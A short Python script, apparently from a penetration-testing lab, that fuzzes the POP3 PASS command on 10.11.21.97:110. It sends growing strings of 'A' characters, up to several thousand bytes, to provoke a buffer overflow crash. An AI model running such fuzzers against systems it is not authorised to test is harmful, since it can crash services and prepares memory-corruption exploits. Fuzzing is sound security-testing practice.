#!/usr/bin/env python
import socket

if __name__ == '__main__':

	# Create an array of buffers, from 1 to 5900, with increments of 200
	buffer = ["A"]
	counter = 100

	while len(buffer) <= 30:
		buffer.append("A" * counter)
		counter = counter + 200

	#for entry in buffer:
	#	print(entry)

	# fuzz the PASS command with generated buffers
	for string in buffer:
		print("Fuzzing PASS with {0} bytes...".format(str(len(string))))
		
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect = sock.connect(('10.11.21.97', 110))
		
		# receive the banner
		sock.recv(1024).decode("utf-8")
		# send user name
		buff = "USER test\r\n".encode("utf-8")
		sock.send(buff)
		# receive the result
		data = sock.recv(1024).decode("utf-8")
		print(data)
		
		# send pass and buffer
		buff = ("PASS " + string + "\r\n").encode("utf-8")
		sock.send(buff)

		# receive the result
		data = sock.recv(1024).decode("utf-8")
		print(data)
		
		# quit and close the connection
		quit_cmd = "QUIT\r\n".encode("utf-8")
		sock.send(quit_cmd)
		sock.close()

	
		
